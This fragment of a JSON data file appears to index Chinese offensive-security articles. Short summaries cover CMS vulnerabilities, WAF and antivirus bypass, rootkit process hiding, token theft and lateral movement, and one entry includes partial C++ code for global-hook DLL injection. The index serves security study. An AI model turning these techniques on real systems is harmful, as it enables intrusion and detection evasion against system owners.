        "page_content": "本文讨论了蓝队反制红队的技术，包括通过 IP 地址溯源、威胁情报分析、社工查询和反制红队基础设施（如 Cobalt Strike）等方法。这些技术旨在帮助蓝队识别和应对红队的攻击，并保护他们的网络免受损害。",
        "FileName": "8385-红蓝对抗系列之浅谈蓝队反制红队的手法一二.pdf"
    },
    {
        "page_content": "该文档分析了 wuzhicms 内容管理系统中的多个安全漏洞，包括敏感信息泄露、SQL 注入、任意文件读取和删除、逻辑漏洞以及远程代码执行 (RCE)。作者通过对源代码的审计，发现了这些漏洞并提供了利用方法，强调了该系统在安全方面的不足。",
        "FileName": "10620-一次wuzhicms审计.pdf"
    },
    {
        "page_content": "该文档记录了一次地级市攻防演练，其中涉及信息收集、打点、弹完整 shell、代理、刷内网、终端对抗等技术，并分享了在遇到问题时的解决思路和技巧，例如利用向日葵配置文件获取密码、绕过杀软、刷本机分等。",
        "FileName": "12827-记一次地级市攻防3W分.pdf"
    },
    {
        "page_content": "本文档探讨了 Apache、Nginx 和 Tomcat 等常见 Web 服务器之间的区别，并重点介绍了 Apache 和 Tomcat 的集成以及 Apache 文件解析漏洞、ActiveMQ 漏洞和 Apache Solr 漏洞等安全配置和红队攻击漏洞。",
        "FileName": "7620-中间件安全-Apache.pdf"
    },
    {
        "page_content": "该文档介绍了一种基于 ASM 污点跟踪的 JSP Webshell 查找工具 JspFinder 的设计和实现。该工具通过分析 JSP 文件的字节码，识别恶意方法调用，并追踪污点流向，从而检测是否存在 Webshell。它采用逆拓扑排序算法，从最底层的恶意方法开始分析，逐步向上追踪污点流向，最终确定是否存在可控的请求参数可以流入恶意方法，从而判断 JSP 文件是否为 Webshell。",
        "FileName": "10727-一款根据ASM污点流扫描 Jsp Webshell的工具.pdf"
    },
    {
        "page_content": "代码同源检测技术是一种基于源代码分析的 SCA 技术，用于识别和分析软件供应链中开源组件的代码克隆、已知漏洞和恶意代码，帮助企业管理和降低开源组件风险，确保供应链安全和可靠性。",
        "FileName": "12575-SCA 技术进阶系列（二）：代码同源检测技术在供应链安全治理中的应用.pdf"
    },
    {
        "page_content": "该文档分析了64位程序中的栈溢出进阶技术，包括ret2csu、花式栈溢出和栈迁移，并提供了利用这些技术绕过Canary保护和NX保护的示例代码。",
        "FileName": "12729-栈溢出进阶与花式栈溢出.pdf"
    },
    {
        "page_content": "该文档分析了 PowerCreator CMS 中的三个任意文件上传漏洞，这些漏洞允许攻击者上传任意文件并获得服务器控制权。第一个漏洞存在于 UploadResourcePic.ashx 中，第二个漏洞存在于 uploadCoursePic.ashx 中，第三个漏洞存在于 UploadLogo.ashx 中。通过分析代码，研究人员发现这些漏洞是由未授权访问上传接口、缺乏文件类型检查以及不正确的错误处理造成的。研究人员还提供了利用这些漏洞的有效载荷，并建议用户更新到最新版本的 CMS 以修复这些漏洞。",
        "FileName": "8478-从蜜罐上线到1day发现.pdf"
    },
    {
        "page_content": "ioctlbf 是一款用于发现 Windows 内核驱动程序漏洞的工具，它通过扫描驱动程序支持的 IOCTL 和执行基于生成的 IOCTL fuzz 来检测驱动程序中可能存在的问题。该工具不依赖于捕获的 IOCTL，因此能够检测到驱动程序支持但很少或从未被用户使用的 IOCTL，从而提高漏洞挖掘的效率。",
        "FileName": "7282-内核漏洞挖掘技术系列(8)——ioctlbf.pdf"
    },
    {
        "page_content": "该文档主要介绍了如何绕过安全狗和云锁等 Web 应用程序防火墙 (WAF) 的 SQL 注入检测。它提供了各种技术，包括特殊运算符、注释、联合注入、盲注和报错，以及如何使用垃圾数据填充来绕过云锁的增强防护。",
        "FileName": "7578-waf-bypass学习.pdf"
    },
    {
        "page_content": "该文档分析了某凌 EKP 中的一个未授权访问漏洞，该漏洞允许攻击者读取 resource 目录下的所有文件，包括敏感信息。该漏洞是由于 RedirectServlet 中的逻辑缺陷造成的，该缺陷允许攻击者通过添加额外的斜杠来绕过路径验证，从而访问受限文件。该漏洞影响某凌 EKP 的多个版本，修复方法是联系官方打补丁。",
        "FileName": "12860-某凌EKP未授权访问漏洞分析.pdf"
    },
    {
        "page_content": "本文探讨了使用二次编译和去特征技术对 Mimikatz 源代码进行免杀的尝试。作者尝试了各种方法，包括替换关键字、删除敏感信息和替换图标，但最终发现无法完全绕过火绒和 Windows Defender 的检测。然而，作者发现 360 安全卫士在本地不会主动查杀，而是依赖于云端查杀，因此在上传样本之前有一段时间的窗口期可以执行命令。",
        "FileName": "10821-失败mimikatz源码免杀和成功的免杀Windows Defender.pdf"
    },
    {
        "page_content": "该文档介绍了 Ripstech Java Security 2019 日历复现系列中的三个漏洞，包括 Day 1 的 XXE 漏洞、Day 2 的任意对象实例化漏洞和 Day 3 的 Velocity 模板注入漏洞，并提供了每个漏洞的复现过程和代码示例。",
        "FileName": "7098-Ripstech Java Security 2019 Calendar复现系列(一).pdf"
    },
    {
        "page_content": "这篇文档详细介绍了在内网渗透靶场中利用各种漏洞和技术，包括ThinkPHP远程命令执行、MS17-010永恒之蓝漏洞、IPC连接、计划任务和DSRM后门，逐步获取内网权限并进行横向移动，最终获得域控权限。",
        "FileName": "9807-一次简单的内网渗透靶场实战.pdf"
    },
    {
        "page_content": "该文档介绍了如何利用蓝天采集器 v2.3.1 中的漏洞来获取 Web 服务器的 shell 访问权限。该漏洞存在于后台安装插件功能中，允许攻击者通过添加 Origin 请求头并构造符合特定条件的 JSON 数据来写入恶意 PHP 文件，从而执行任意 PHP 代码。",
        "FileName": "7873-蓝天采集器v2.3.1 getshell.pdf"
    },
    {
        "page_content": "本文档详细描述了如何应对一次内网挖矿病毒攻击，包括确定攻击是否发生、查找攻击入口点、删除挖矿病毒以及进行入侵排查整理等步骤。",
        "FileName": "9180-一次内网挖矿病毒的应急响应.pdf"
    },
    {
        "page_content": "该文档提供了使用 Drozer 安卓调试工具进行安卓应用程序安全测试的详细指南，涵盖了从安装和配置到使用各种命令进行攻击面分析、数据泄露检测、目录遍历和利用服务和广播接收器等内容。",
        "FileName": "10605-使用Drozer安卓调试手册.pdf"
    },
    {
        "page_content": "该文档分析了 PbootCMS V3.0.1 中的任意代码执行漏洞，该漏洞允许攻击者通过绕过过滤机制在系统中执行任意代码。攻击者可以通过在函数名和括号之间插入控制字符或使用 array_filter 函数来绕过过滤，并通过将 system 函数放入 header 头中来执行命令。利用该漏洞，攻击者可以在后台站点信息处插入恶意代码，并通过修改 cookie 中的 session 配置项来执行任意命令。",
        "FileName": "8321-PbootCMS V3.0.1任意代码执行.pdf"
    },
    {
        "page_content": "**文档主题：** DLL 注⼊技术\n\n**文档内容：**\n\nDLL 注⼊技术是向正在运⾏的进程插⼊ / 注⼊代码的过程。注⼊的代码以动态链接库（ DLL ）的形式存在。 DLL ⽂件在运⾏时将按需加载（类似于 UNIX 系统中的共享库 (share object ，扩展名为 .so) ）。然⽽实际上，我们可以以其他的多种形式 注⼊代码（正如恶意软件中所常⻅的，任意 PE ⽂件， shellcode 代码 / 程序集等）。\n\n在 Windows ⼤部分应⽤都是基于消息机制，他们都拥有⼀个消息过程函数，根据不同消息完成不同功能， windows 通过钩⼦机制来 截获和监视系统中的这些消息。⼀般钩⼦分局部钩⼦与全局钩⼦，局部钩⼦⼀般⽤于某个线程，⽽全局钩⼦⼀般通过 dll ⽂件实现 相 应的钩⼦函数。\n\nSetWindowsHookEx HHOOK \t WINAPI \t SetWindowsHookEx ( __in \t int \t idHook , \t \\\\ 钩⼦类型 __in \t HOOKPROC \t lpfn , \t \\\\ 回调函数地址 __in \t HINSTANCE \t hMod , \t \\\\ 实例句柄 __in \t DWORD \t dwThreadId ); \t \\\\ 线程 ID 通过设定钩⼦类型与回调函数的地址，将定义的钩⼦函数安装到挂钩链中。如果函数成功返回钩⼦的句柄，如果函数失败，则返回 NULL 由上述介绍可以知道如果创建的是全局钩⼦，那么钩⼦函数必须在⼀个 DLL 中。这是因为进程的地址空间是独⽴的 , 发⽣对应事件的 进程不能调⽤其他进程地址空间的钩⼦函数。如果钩⼦函数的实现代码在 DLL 中 , 则在对应事件发⽣时，系统会把这个 DLL 加较到发 ⽣事体的进程地址空间中 , 使它能够调⽤钩⼦函数进⾏处理。\n\n在操作系统中安装全局钩⼦后 , 只要进程接收到可以发出钩⼦的消息，全局钩⼦的 DLL ⽂件就会由操作系统⾃动或强⾏地加载到该进 程中。因此，设置全局钩⼦可以达到 DLL 注⼊的⽬的。创建⼀个全局钩⼦后 , 在对应事件发⽣的时候 , 系统就会把  DLL 加载到发⽣事 件的进程中 , 这样 , 便实现了 DLL 注⼊。\n\n为了能够让 DLL 注⼊到所有的进程中 , 程序设置 \t WH_GETMESSAGE \t 消息的全局钩⼦。因为 \t WH_GETMESSAGE \t 类型的钩⼦会监视消息队 列，并且  Windows 系统是基于消息驱动的 , 所以所有进程都会有⾃⼰的⼀个消息队列，都会加载   \t WH_GETMESSAGE \t 类型的全局钩⼦ DLL 。 那么设置 \t WH_GETMESSAGE \t 就可以通过以下代码实现，记得加上判断是否设置成功 何为 dll 注⼊ 全局钩⼦注⼊ 核⼼函数 实现原理//\t 设置全局钩⼦ BOOL \t SetHook () { \t\t\t\t g_Hook \t = \t :: SetWindowsHookEx ( WH_GETMESSAGE , \t ( HOOKPROC ) GetMsgProc , \t g_hDllMoudle , \t 0 ); \t\t\t\t if \t ( g_Hook \t == \t NULL ) \t\t\t\t { \t\t\t\t\t\t\t\t return \t FALSE ; \t\t\t\t } \t\t\t\t return \t TRUE ; } 这⾥第⼆个参数是回调函数，那么我们还需要写⼀个回调函数的实现，这⾥就需要⽤到 \t CallNextHookEx \t 这个 api ，主要是第⼀个 参数，这⾥传⼊钩⼦的句柄的话，就会把当前钩⼦传递给下⼀个钩⼦，若参数传⼊ 0 则对钩⼦进⾏拦截 //\t 钩⼦回调函数 LRESULT \t GetMsgProc ( int \t code , \t WPARAM \t wParam , \t LPARAM \t lParam ) { \t\t\t\t return \t :: CallNextHookEx ( g_Hook , \t code , \t wParam , \t lParam ); } 既然我们写⼊了钩⼦，如果不使⽤的情况下就需要将钩⼦卸载掉，那么这⾥使⽤到 \t UnhookWindowsHookEx \t 这个 api 来卸载钩⼦ //\t 卸载钩⼦ BOOL \t UnsetHook () { \t\t\t\t if \t ( g_Hook ) \t\t\t\t { \t\t\t\t\t\t\t\t :: UnhookWindowsHookEx ( g_Hook ); \t\t\t\t } } 既然我们使⽤到了 \t SetWindowsHookEx \t 这个 api ，就需要进⾏进程间的通信，进程通信的⽅法有很多，⽐如⾃定义消息、管道、 dll 共享节、共享内存等等，这⾥就⽤共享内存来实现进程通信 //\t 共享内存 #pragma\tdata_seg(\"mydata\") \t\t\t\t HHOOK \t g_hHook \t = \t NULL ; #pragma\tdata_seg() #pragma\tcomment(linker,\t\"/SECTION:mydata,RWS\" ⾸先新建⼀个 dll 实现过程在 \t pch.h \t 头⽂件⾥⾯声明这⼏个我们定义的函数都是裸函数，由我们⾃⼰平衡堆栈 extern \t \"C\" \t _declspec ( dllexport ) \t int \t SetHook (); extern \t \"C\" \t _declspec ( dllexport ) \t LRESULT \t GetMsgProc ( int \t code , \t WPARAM \t wParam , \t LPARAM \t lParam ); extern \t \"C\" \t _declspec ( dllexport ) \t BOOL \t UnsetHook (); 然后在 \t pch.cpp \t ⾥⾯写⼊三个函数并创建共享内存//\tpch.cpp:\t 与预编译标头对应的源⽂件 #include \t \"pch.h\" #include \t <windows.h> #include \t <stdio.h> extern \t HMODULE \t g_hDllModule ; //\t 共享内存 #pragma\tdata_seg(\"mydata\") HHOOK \t g_hHook \t = \t NULL ; #pragma\tdata_seg() #pragma\tcomment(linker,\t\"/SECTION:mydata,RWS\") // 钩⼦回调函数 LRESULT \t GetMsgProc ( int \t code , \t WPARAM \t wParam , \t LPARAM \t lParam ) \t { \t\t\t\t return \t :: CallNextHookEx ( g_hHook , \t code , \t wParam , \t lParam ); } //\t 设置钩⼦ BOOL \t SetHook () \t { \t\t\t\t g_hHook \t = \t SetWindowsHookEx ( WH_GETMESSAGE , \t ( HOOKPROC ) GetMsgProc , \t g_hDllModule , \t 0 ); \t\t\t\t if \t ( NULL \t == \t g_hHook ) \t { \t\t\t\t\t\t\t\t return \t FALSE ; \t\t\t\t } \t\t\t\t return \t TRUE ; } //\t 卸载钩⼦ BOOL \t UnsetHook () \t { \t\t\t\t if \t ( g_hHook ) \t { \t\t\t\t\t\t\t\t UnhookWindowsHookEx ( g_hHook ); \t\t\t\t } \t\t\t\t return \t TRUE ; } 再然后在 \t dllmain.cpp \t 设置 \t DLL_PROCESS_ATTACH \t ，然后编译⽣成 \t Golbal.dll \t//\tdllmain.cpp\t:\t 定义 \tDLL\t 应⽤程序的⼊⼝点。 #include \t \"pch.h\" HMODULE \t g_hDllModule \t = \t NULL ; BOOL \t APIENTRY \t DllMain ( \t HMODULE \t hModule , \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t DWORD",
        "FileName": "10318-关于几种dll注入方式的学习.pdf"
    },
    {
        "page_content": "本文探讨了前端 JS 防破解技术，包括代码混淆和反调试，以防止恶意爬虫分析和篡改代码。代码混淆通过布局、数据和控制混淆来增加代码可读性，而反调试则通过检测控制台打开、调试器使用和函数修改等手段来阻止调试。这些技术有助于保护业务免受爬虫危害，但需要根据业务需求合理使用。",
        "FileName": "11345-【技术推荐】前端JS攻防对抗.pdf"
    },
    {
        "page_content": "本文分析了 Shadowsocks 的源码和密码学漏洞原理，Shadowsocks 是一种网络协议，由于支持 tcp 和 udp，因此经常用于客户端和外部网络服务器之间的中间传输。通过分析 Shadowsocks 的握手过程、加密解密过程和数据结构，本文揭示了其安全机制的原理，并通过实验演示了如何利用已知明文和密文来伪造明文。",
        "FileName": "10251-Shadowsocks漏洞复现.pdf"
    },
    {
        "page_content": "该文档重点介绍了 GitLab 中的常见漏洞，包括 CVE-2016-4340、CVE-2016-9086、CVE-2020-10977、CVE-2021-22205 和 CVE-2021-22214。它提供了漏洞复现步骤、影响版本、环境搭建说明和利用方法，包括提权、重置密码、SSH 免密登录和 SSRF 未授权访问。",
        "FileName": "11690-Gitlab常见漏洞复现及后利用.pdf"
    },
    {
        "page_content": "该文档介绍了如何使用 BurpSuite 对中文用户名进行密码爆破。它提供了两个测试代码段，演示了如何转换中文用户名并将其用于爆破。文档还提供了分步说明，指导用户如何使用 BurpSuite 的 Intruder 模块进行爆破。",
        "FileName": "7853-Burpsuit中文处理及暴力破解应用.pdf"
    },
    {
        "page_content": "MemAFL 是一款基于 AFL 改进的内存敏感模糊测试工具，通过程序预分析、内存敏感、路径覆盖和哈希碰撞率缓解等改进，提高了模糊测试的效率和准确性。该工具通过减少插桩点，降低了哈希碰撞率，从而提高了路径覆盖的准确性。",
        "FileName": "10023-基于AFL改进的内存敏感的模糊测试工具MemAFL.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2019-8518 漏洞，该漏洞是由于 FTL JIT 的 LICM（循环不变代码外提）错误地将 GetByVal 提升到 preheader，导致没有检查数组边界，从而造成 OOB 访问。文档重点关注 edgesDominate 函数，该函数用于确定一个节点的所有子节点是否为 edge dominate，并解释了为什么 GetByVal 可以被提升到循环头，而 CheckInBounds 则不能。",
        "FileName": "10701-CVE-2019-8518漏洞分析.pdf"
    },
    {
        "page_content": "该文档分析了某 KCMS 系统的审计结果，重点关注了系统中存在的安全漏洞。文档指出，该系统存在全局过滤、前台 SQL 注入、后台登录逻辑问题、KindEditor 漏洞等多个安全问题。这些漏洞可能导致攻击者执行恶意代码、窃取敏感信息或破坏系统。文档还提供了相应的 POC 和缓解措施，以帮助系统管理员修复这些漏洞。",
        "FileName": "10952-某KCMS审计小结.pdf"
    },
    {
        "page_content": "本文分析了蚁剑 RCE 的原理，发现其在连接 JSP、ASP 和 ASPX webshell 时存在 XSS 漏洞，导致攻击者可以通过构造恶意 HTML 代码执行远程命令。文章还提供了利用 JavaScript Obfuscator 工具混淆和编码 payload 的方法，以绕过反制措施。",
        "FileName": "8167-浅谈蚁剑RCE.pdf"
    },
    {
        "page_content": "本文介绍了一种利用 PHP 文件读取漏洞的新方法，该方法结合了目录列表和临时文件生成，可以导致反序列化。通过利用 Phar 协议和 Windows 特性，攻击者可以在临时文件中制造时间差，从而利用该漏洞。",
        "FileName": "8137-对PHP中文件读漏洞利用的新方式.pdf"
    },
    {
        "page_content": "该文档分析了 JBoss EAP/AS <= 6.* 中的远程代码执行 (RCE) 漏洞，该漏洞允许攻击者通过 JBoss EAP/AS <= 6.* 的 4446 端口发送恶意数据包来执行任意命令。该漏洞利用了 JBoss Remoting 协议中的反序列化漏洞，攻击者可以通过发送一个经过特殊处理的数据包来触发反序列化，从而执行任意 Java 代码。",
        "FileName": "11301-JBoss EAPAS = 6. RCE及rpc回显.pdf"
    },
    {
        "page_content": "DedeCMS v5.8.1 中存在一个 SSTI 漏洞，可导致远程代码执行。该漏洞源于 ShowMsg() 函数中未过滤的 HTTP_REFERER 变量，攻击者可通过该变量控制 $gourl 变量，进而控制模板解析过程，最终通过包含恶意 PHP 文件实现远程代码执行。",
        "FileName": "10519-DedeCMS-5.8.1 SSTI模板注入导致RCE.pdf"
    },
    {
        "page_content": "OKlite 2.0.0 后台更新压缩包存在漏洞，攻击者可构造包含一句话木马的压缩包上传至目标服务器，服务器在升级过程中会自动解压该压缩包，导致木马被解压出来，从而实现 Getshell。漏洞影响范围为 OKlite <= 2.0.0，利用条件为攻击者可登录 OKlite 后台。",
        "FileName": "8130-OKlite 2.0.0后台更新压缩包导致Getshell浅析.pdf"
    },
    {
        "page_content": "该文档记录了一次授权渗透测试，重点介绍了信息收集、WEBVPN突破、内网渗透和域控控制等步骤。通过收集学号、教工号等信息，利用webvpn账户和FOFA查询，渗透者成功获取了webshell，并通过struts远程代码执行漏洞和sql注入漏洞进一步深入内网，最终控制了域控，实现了对学校机房的远程开机关机和监视。",
        "FileName": "10392-记一次授权渗透测试.pdf"
    },
    {
        "page_content": "本文档介绍了中间人攻击（MITM）的原理、手法和效果，重点关注ARP欺骗和DNS劫持。ARP欺骗通过伪造ARP响应，将受害者的流量重定向到攻击者，而DNS劫持通过伪造DNS响应，将受害者连接到错误的IP地址。文档还介绍了使用mitmproxy拦截和修改HTTP/HTTPS流量，以及安装mitmproxy根证书以解密加密流量。",
        "FileName": "12880-部分中间人攻击手法简介.pdf"
    },
    {
        "page_content": "该文档分析了 YCCMS 代码中的多个漏洞，包括未授权更改管理员账号密码、任意文件删除、任意文件上传、验证码重放和反射型 XSS。这些漏洞主要是由于缺乏输入验证、路径穿越和文件类型检查不当造成的。文档建议通过正则匹配过滤、加密 ID、白名单验证和权限访问控制来修复这些漏洞。",
        "FileName": "7748-YCCMS代码审计(新手教学方向).pdf"
    },
    {
        "page_content": "该文档分析了用友 NC 6.5 反序列化漏洞，该漏洞允许攻击者通过向服务器发送恶意序列化对象来执行任意代码。文档详细介绍了漏洞的分析和复现过程，包括环境搭建、漏洞分析和漏洞复现。",
        "FileName": "8242-用友 NC 6.5反序列化漏洞复现与分析.pdf"
    },
    {
        "page_content": "该文档介绍了如何利用 Axis 1.4 AdminService 中的未授权访问和 JNDI 注入漏洞，通过注册恶意服务并调用 JNDI 服务，攻击者可以执行任意方法，包括反弹 shell。漏洞形成前提是开启 RemoteAdmin 服务，并部署刷新配置。利用过程包括注册服务、调用 JNDI 服务和反弹 shell。",
        "FileName": "7981-axis 1.4 AdminService未授权访问 jndi注入利用.pdf"
    },
    {
        "page_content": "该文档详细分析了 ThinkPHP 5.0.15 版本中 SQL 注入漏洞的成因，并通过逐行跟踪源码的方式，对漏洞的利用过程进行了详细的讲解。文档中还提供了漏洞复现的步骤，并对漏洞修复方法进行了说明。",
        "FileName": "9124-thinkphp5.0 SQL注入详细分析.pdf"
    },
    {
        "page_content": "该文档讨论了利用 Chrome 浏览器中的一个 bug 来绕过 XSS 过滤，该 bug 允许将 autofocus 属性与任何 HTML 标签一起使用。通过使用 tabindex、contenteditable 或 user-modify 属性，攻击者可以创建自创标签，在用户与元素交互时触发恶意脚本。这种技术对于在没有用户交互的情况下无法转义元素上下文并需要 XSS 的情况下非常有用。",
        "FileName": "7702-autofocus属性的自创标签xss(xss).pdf"
    },
    {
        "page_content": "该文档介绍了如何利用 Chaos-Rootkit 项目隐藏进程，该项目基于 x64 内核模块下的 rootkit，通过修改相邻进程节点的 Flink 和 Blink 指针，让这两个指针相互指向，从而使内核在遍历双链表结构时找不到隐藏的进程。此外，该项目还提供了提权功能，通过驱动程序获取系统令牌并将其替换为当前进程的令牌，从而让当前进程拥有系统权限。",
        "FileName": "12518-根据Chaos-Rootkit项目来掌握进程隐藏.pdf"
    },
    {
        "page_content": "该文档主要介绍了 JRE8u20 反序列化漏洞的原理和绕过思路。漏洞利用了 JDK7u21 的构造原理和 BeanContextSupport 类的反序列化对异常的捕获，绕过了 AnnotationInvocationHandler 反序列的修复。通过构造一个满足特定条件的类（如 Example 和 Wrapper），可以利用 BeanContextSupport 类的 readObject 方法捕获 AnnotationInvocationHandler 类的 readObject 方法抛出的异常，从而绕过修复并执行任意代码。",
        "FileName": "7240-JRE8u20 反序列化.pdf"
    },
    {
        "page_content": "这篇文档分析了 CVE-2022-22978 漏洞，该漏洞影响 Spring Security 中的 RegexRequestMatcher，导致认证绕过和转发流程问题。文档详细解释了漏洞成因、环境搭建、调试分析以及如何通过在路径上添加单行模式来修复漏洞。",
        "FileName": "11473-CVE-2022-22978 Spring Security RegexRequestMatcher 认证绕过及转发流程分析.pdf"
    },
    {
        "page_content": "本文介绍了绕过 Android APP 中的 Root 检测和 SSL Pinning 机制的两种方法。第一种方法使用 Magisk 26.1 及其 Zygisk 功能，通过隐藏 Root 权限来绕过 Root 检测。第二种方法使用 Frida 和 Objection 工具，通过禁用 SSL Pinning 来绕过该机制，从而允许抓取 HTTPS 流量。",
        "FileName": "12858-Android APP 绕过安全检测机制.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何复现 ThinkPHP3.2.X 通用漏洞，包括环境搭建、漏洞原理分析和利用步骤。该漏洞利用了日志泄露和文件包含，攻击者可以通过精心构造的请求将恶意代码写入日志文件，然后通过文件包含执行任意代码。",
        "FileName": "12773-ThinkPHP3.2.X通用漏洞复现.pdf"
    },
    {
        "page_content": "该文档分析了 zfaka SQL 注入漏洞，该漏洞存在于 `application/modules/Product/controllers/Query.php` 文件中，攻击者可以通过修改 `X-Forwarded-For` 头部来注入恶意 SQL 语句，从而执行任意 SQL 查询，包括添加管理员用户。文档还提供了半自动化脚本，用于利用该漏洞添加管理员用户。",
        "FileName": "9933-zfaka sql注入分析.pdf"
    },
    {
        "page_content": "该文档分析了 ThinkPHP3 中的两个远程代码执行 (RCE) 漏洞。第一个漏洞利用了 show() 函数中的命令执行入口，而第二个漏洞则利用了 assign() 函数中的变量覆盖。攻击者可以通过精心设计的请求来触发这些漏洞，从而在目标服务器上执行任意代码。",
        "FileName": "10876-thinkphp3 rce分析合集.pdf"
    },
    {
        "page_content": "该文档详细介绍了 Oracle 数据库注入的各个方面，包括判断注入点、利用联合查询和报错注入来查询数据、通过 HTTP 请求和 DNSlog 外带数据，以及基于布尔值和时间的盲注。它还提供了实际案例分析，强调了在测试中寻找后端交互的重要性。",
        "FileName": "8020-Oracle  注入 All in ONE.pdf"
    },
    {
        "page_content": "该文档分析了安洵杯 2020  官⽅ Writeup(Re/Pwn) - D0g3{cyzcc_have_ten_girlfriends} 题⽬，该题⽬是个去了符号表的 mips 程序，需要使⽤ ghidra 和 ida 联合分析，涉及 strcmp 函数、strstr 函数、kmp 算法、test 函数等知识点。通过分析，可以发现该题⽬存在 strcmp 函数、strstr 函数、kmp 算法、test 函数等知识点，需要使⽤ ghidra 和 ida 联合分析才能解决。",
        "FileName": "8582-安洵杯2020 官方Writeup(RePwn) - D0g3.pdf"
    },
    {
        "page_content": "本文分析了 PHP 中 GET、POST 和 COOKIE 变量的处理过程，重点关注了 URL 解码和变量注册过程中的绕过技巧。这些技巧包括变量名和值 URL 解码、变量名截断、空格和点号转换以及变量名中方括号的处理。通过了解这些技巧，攻击者可以绕过 WAF 流量层面的检测，从而执行恶意操作。",
        "FileName": "11512-PHP变量流量层面WAF绕过.pdf"
    },
    {
        "page_content": "本文档介绍了令牌窃取技术，该技术用于在内网渗透中从 Administrator 权限提升到 System 权限或获取 trustedinstaller 等权限。通过 NtQuerySystemInformation API 枚举本地计算机上的所有访问令牌，并使用 NtQueryObject API 检索句柄对应的对象类型，可以过滤出所有访问令牌的句柄。然后，通过 OpenProcessToken 函数获取进程本身的令牌句柄，并使用 GetTokenInformation 函数获取令牌的 TokenImpersonationLevel 成员来确定访问令牌的模拟级别。最后，使用 CreateProcessAsUserA 函数来执行命令，该函数需要 SeTcbPrivilege 和 SE_ASSIGNPRIMARYTOKEN_NAME 特权，可以通过 ImpersonateLoggedOnUser 函数模拟 NT AUTHORITY\\SYSTEM 账户来获得这些特权。",
        "FileName": "11981-内网渗透从零到一之令牌窃取.pdf"
    },
    {
        "page_content": "Kubernetes（k8s）是一种容器调度平台，其访问控制过程涉及认证（检查用户身份）、授权（判断用户权限）和准入控制（请求的最后一步）。k8s支持多种授权机制，包括基于属性的访问控制（ABAC）、基于角色的访问控制（RBAC）、Webhook和节点鉴权。攻击者可以通过未授权访问API Server、Kubelet API或etcd来接管k8s集群，还可以利用亲和性和反亲和性来控制pod在特定节点上生成，从而逃逸到目标节点。",
        "FileName": "11316-K8S云原生环境渗透学习.pdf"
    },
    {
        "page_content": "该文档介绍了 Geacon，一个用 Golang 编写的弹 beacon 会话的工具。它提供了代码目录、主程序、脚本和工具的概述，并详细分析了主程序 main.go 中的代码，包括上线包发送、心跳包循环、命令执行和结果回传等功能。",
        "FileName": "7259-Geacon代码学习&上线指南.pdf"
    },
    {
        "page_content": "该文档分析了 VMware VRealize Network Insight 中的两个漏洞：一个未授权命令注入漏洞（VMSA-2022-0031）和一个目录穿越漏洞。作者通过分析 nginx 配置文件和抓取网络数据包，绕过了补丁限制，成功利用了命令注入漏洞。此外，作者还发现了另一个目录穿越漏洞，该漏洞允许攻击者通过绕过 nginx 规则来执行任意命令。",
        "FileName": "12608-VMware VRealize Network Insight 命令注入和目录穿越及补丁绕过.pdf"
    },
    {
        "page_content": "House of Apple3 是一种适用于高版本 glibc 的 IO 攻击方法，它通过伪造 _IO_FILE 中的 _codecvt 来控制程序执行流，可以保持 _wide_data 为默认值，若要控制 rsi，则也可伪造 _wide_data 为可控堆地址。",
        "FileName": "12454-house of apple3 心得体会.pdf"
    },
    {
        "page_content": "该文档记录了一次渗透和审计实战，详细介绍了利用 TP3.2.3 CMS 中的 SQL 注入漏洞、缓存文件漏洞、后台 RCE 漏洞、存储型 XSS 漏洞等进行渗透和审计的过程，并最终通过爆破密码和目录穿越漏洞获得了目标站点的控制权。",
        "FileName": "8305-记一次渗透+审计实战.pdf"
    },
    {
        "page_content": "该文档分析了两个 SQL 注入漏洞，它们存在于登录系统中。第一个漏洞允许攻击者绕过登录类型检查，第二个漏洞允许攻击者绕过验证代码检查。文档还提供了利用这些漏洞的步骤，并解释了如何修改源代码以修复它们。",
        "FileName": "8421-水水的记录某微两处SQL注入.pdf"
    },
    {
        "page_content": "本文重点介绍了 API 安全，总结了常见的 API 攻击面，包括 GraphQL、SOAP-WSDL、REST、API 网关、JWT 认证和 Spring Security 漏洞。它还提供了测试 API 端点的工具和方法，并强调了在 API 安全测试中关注权限问题和基础设施安全的重要性。",
        "FileName": "11977-API安全学习笔记.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何绕过 WAF 对 MSSQL 注入攻击的拦截，包括使用大小写转换、空格替换、注释符和限定符插入等技术。通过这些绕过方法，攻击者可以查询数据库版本、当前用户、表名，并最终获取管理员用户名和密码，从而成功登录后台。",
        "FileName": "7487-记一次实战MSSQL注入绕过WAF.pdf"
    },
    {
        "page_content": "该文档分析了 Windows 内核漏洞中的 UAF（使用后释放）漏洞，并提供了漏洞利用的详细步骤，包括池喷射技术和内核对象分析。",
        "FileName": "9975-windows内核漏洞分析-01 UAF.pdf"
    },
    {
        "page_content": "本文档详细介绍了内存写⼊技术，包括重定位表、IAT 表和修复这些表的方法。通过申请内存 shellcode 并修复重定位表和 IAT 表，可以实现更隐蔽的 DLL 注⼊，从而绕过传统的注⼊检测机制。",
        "FileName": "10463-内存写入技术详解.pdf"
    },
    {
        "page_content": "该文档讨论了在 Windows 环境下使用 Shiro 进行盲打攻击时遇到的极端条件，重点关注无法访问网络或执行 PowerShell 脚本的情况。它介绍了一种通过在文件中写入数据并使用 DNSlog 将其带出的方法，并提供了在 Windows 和 Linux 系统中执行此方法的命令。",
        "FileName": "7941-踩坑记录-Shiro(Windows)极端条件的突破.pdf"
    },
    {
        "page_content": "Pass-the-Hash (PtH) 攻击是一种通过捕获密码哈希值来实现横向移动的攻击技术，它利用了身份验证协议中密码哈希值保持不变的特性。攻击者可以通过抓取系统的活动内存或其他技术来获取哈希值，然后将其传递给其他网络系统进行身份验证。虽然 PtH 攻击在 Windows 系统上最为普遍，但它也可以在 Linux、Unix 和其他平台上发生。为了缓解 PtH 攻击，微软在 Windows Vista 和 Windows Server 2008 中引入了 KB2871997 补丁，该补丁通过删除 LSASS 缓存中的明文凭据来减轻 PtH 攻击的基础。此外，UAC 远程限制策略也可以限制 RID 为 500 的本地管理员账户进行远程登录，从而进一步防止 PtH 攻击。",
        "FileName": "8117-浅探内网横向移动-Pass The Hash.pdf"
    },
    {
        "page_content": "该文档主要介绍了 Python 沙箱逃逸的原理和内容，并提供了多种逃逸思路和常⻅的逃逸⽅法。",
        "FileName": "9473-python沙箱逃匿详解.pdf"
    },
    {
